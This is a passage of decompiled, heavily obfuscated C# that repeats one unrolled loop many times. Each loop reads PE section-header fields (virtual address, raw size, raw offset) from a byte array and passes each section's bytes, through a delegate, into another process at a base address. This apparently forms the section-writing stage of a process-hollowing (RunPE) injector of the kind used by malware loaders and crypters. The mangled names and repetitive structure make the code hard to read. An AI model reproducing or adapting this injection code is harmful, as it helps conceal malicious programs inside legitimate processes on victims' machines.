						((byte*)ptr)[3869] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1080))), array89, array89.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3869] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3873] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3873] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1092)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1096)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1100)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3871] = ((*(int*)((byte*)ptr + 1096) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3871] != 0)
					{
						byte[] array90;
						checked
						{
							array90 = new byte[*unchecked((int*)((byte*)ptr + 1096)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1100), array90, 0, array90.Length);
						((byte*)ptr)[3872] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1092))), array90, array90.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3872] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3876] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3876] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1104)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1108)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1112)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3874] = ((*(int*)((byte*)ptr + 1108) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3874] != 0)
					{
						byte[] array91;
						checked
						{
							array91 = new byte[*unchecked((int*)((byte*)ptr + 1108)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1112), array91, 0, array91.Length);
						((byte*)ptr)[3875] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1104))), array91, array91.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3875] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3879] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3879] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1116)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1120)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1124)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3877] = ((*(int*)((byte*)ptr + 1120) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3877] != 0)
					{
						byte[] array92;
						checked
						{
							array92 = new byte[*unchecked((int*)((byte*)ptr + 1120)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1124), array92, 0, array92.Length);
						((byte*)ptr)[3878] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1116))), array92, array92.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3878] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3882] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3882] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1128)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1132)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1136)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3880] = ((*(int*)((byte*)ptr + 1132) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3880] != 0)
					{
						byte[] array93;
						checked
						{
							array93 = new byte[*unchecked((int*)((byte*)ptr + 1132)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1136), array93, 0, array93.Length);
						((byte*)ptr)[3881] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1128))), array93, array93.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3881] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3885] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3885] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1140)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1144)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1148)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3883] = ((*(int*)((byte*)ptr + 1144) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3883] != 0)
					{
						byte[] array94;
						checked
						{
							array94 = new byte[*unchecked((int*)((byte*)ptr + 1144)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1148), array94, 0, array94.Length);
						((byte*)ptr)[3884] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1140))), array94, array94.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3884] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3888] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3888] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1152)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1156)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1160)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3886] = ((*(int*)((byte*)ptr + 1156) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3886] != 0)
					{
						byte[] array95;
						checked
						{
							array95 = new byte[*unchecked((int*)((byte*)ptr + 1156)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1160), array95, 0, array95.Length);
						((byte*)ptr)[3887] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1152))), array95, array95.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3887] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3891] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3891] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1164)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1168)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1172)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3889] = ((*(int*)((byte*)ptr + 1168) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3889] != 0)
					{
						byte[] array96;
						checked
						{
							array96 = new byte[*unchecked((int*)((byte*)ptr + 1168)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1172), array96, 0, array96.Length);
						((byte*)ptr)[3890] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1164))), array96, array96.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3890] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3894] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3894] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1176)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1180)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1184)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3892] = ((*(int*)((byte*)ptr + 1180) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3892] != 0)
					{
						byte[] array97;
						checked
						{
							array97 = new byte[*unchecked((int*)((byte*)ptr + 1180)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1184), array97, 0, array97.Length);
						((byte*)ptr)[3893] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1176))), array97, array97.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3893] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3897] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3897] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1188)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1192)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1196)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3895] = ((*(int*)((byte*)ptr + 1192) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3895] != 0)
					{
						byte[] array98;
						checked
						{
							array98 = new byte[*unchecked((int*)((byte*)ptr + 1192)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1196), array98, 0, array98.Length);
						((byte*)ptr)[3896] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1188))), array98, array98.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3896] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3900] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3900] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1200)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1204)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1208)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3898] = ((*(int*)((byte*)ptr + 1204) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3898] != 0)
					{
						byte[] array99;
						checked
						{
							array99 = new byte[*unchecked((int*)((byte*)ptr + 1204)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1208), array99, 0, array99.Length);
						((byte*)ptr)[3899] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1200))), array99, array99.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3899] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3903] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3903] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1212)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1216)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1220)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3901] = ((*(int*)((byte*)ptr + 1216) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3901] != 0)
					{
						byte[] array100;
						checked
						{
							array100 = new byte[*unchecked((int*)((byte*)ptr + 1216)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1220), array100, 0, array100.Length);
						((byte*)ptr)[3902] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1212))), array100, array100.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3902] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3906] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3906] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1224)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1228)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1232)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3904] = ((*(int*)((byte*)ptr + 1228) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3904] != 0)
					{
						byte[] array101;
						checked
						{
							array101 = new byte[*unchecked((int*)((byte*)ptr + 1228)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1232), array101, 0, array101.Length);
						((byte*)ptr)[3905] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1224))), array101, array101.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3905] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3909] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3909] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1236)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1240)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1244)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3907] = ((*(int*)((byte*)ptr + 1240) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3907] != 0)
					{
						byte[] array102;
						checked
						{
							array102 = new byte[*unchecked((int*)((byte*)ptr + 1240)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1244), array102, 0, array102.Length);
						((byte*)ptr)[3908] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1236))), array102, array102.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3908] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3912] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3912] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1248)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1252)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1256)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3910] = ((*(int*)((byte*)ptr + 1252) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3910] != 0)
					{
						byte[] array103;
						checked
						{
							array103 = new byte[*unchecked((int*)((byte*)ptr + 1252)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1256), array103, 0, array103.Length);
						((byte*)ptr)[3911] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1248))), array103, array103.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3911] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3915] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3915] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1260)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1264)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1268)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3913] = ((*(int*)((byte*)ptr + 1264) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3913] != 0)
					{
						byte[] array104;
						checked
						{
							array104 = new byte[*unchecked((int*)((byte*)ptr + 1264)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1268), array104, 0, array104.Length);
						((byte*)ptr)[3914] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1260))), array104, array104.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3914] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3918] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3918] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1272)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1276)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1280)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3916] = ((*(int*)((byte*)ptr + 1276) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3916] != 0)
					{
						byte[] array105;
						checked
						{
							array105 = new byte[*unchecked((int*)((byte*)ptr + 1276)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1280), array105, 0, array105.Length);
						((byte*)ptr)[3917] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1272))), array105, array105.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3917] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3921] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3921] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1284)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1288)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1292)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3919] = ((*(int*)((byte*)ptr + 1288) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3919] != 0)
					{
						byte[] array106;
						checked
						{
							array106 = new byte[*unchecked((int*)((byte*)ptr + 1288)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1292), array106, 0, array106.Length);
						((byte*)ptr)[3920] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1284))), array106, array106.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3920] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3924] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3924] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1296)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1300)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1304)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3922] = ((*(int*)((byte*)ptr + 1300) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3922] != 0)
					{
						byte[] array107;
						checked
						{
							array107 = new byte[*unchecked((int*)((byte*)ptr + 1300)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1304), array107, 0, array107.Length);
						((byte*)ptr)[3923] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1296))), array107, array107.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3923] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 32)) += 40;
						(*unchecked((int*)((byte*)ptr + 36)))++;
					}
				}
				while (true)
				{
					((byte*)ptr)[3927] = ((*(int*)((byte*)ptr + 36) <= checked(*unchecked((short*)((byte*)ptr + 3596)) - 1)) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3927] == 0)
					{
						break;
					}
					checked
					{
						*unchecked((int*)((byte*)ptr + 1308)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 12);
						*unchecked((int*)((byte*)ptr + 1312)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 16);
						*unchecked((int*)((byte*)ptr + 1316)) = BitConverter.ToInt32(array, *unchecked((int*)((byte*)ptr + 32)) + 20);
					}
					((byte*)ptr)[3925] = ((*(int*)((byte*)ptr + 1312) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[3925] != 0)
					{
						byte[] array108;
						checked
						{
							array108 = new byte[*unchecked((int*)((byte*)ptr + 1312)) - 1 + 1];
						}
						Buffer.BlockCopy(array, *(int*)((byte*)ptr + 1316), array108, 0, array108.Length);
						((byte*)ptr)[3926] = ((!delegate3(CS_0024_003C_003E8__locals0.class5_0.struct0_0.intptr_0, checked(CS_0024_003C_003E8__locals0.int_0 + *unchecked((int*)((byte*)ptr + 1308))), array108, array108.Length, ref *(int*)((byte*)ptr + 8))) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[3926] != 0)
						{
							throw new Exception();
						}
					}
					checked
					{
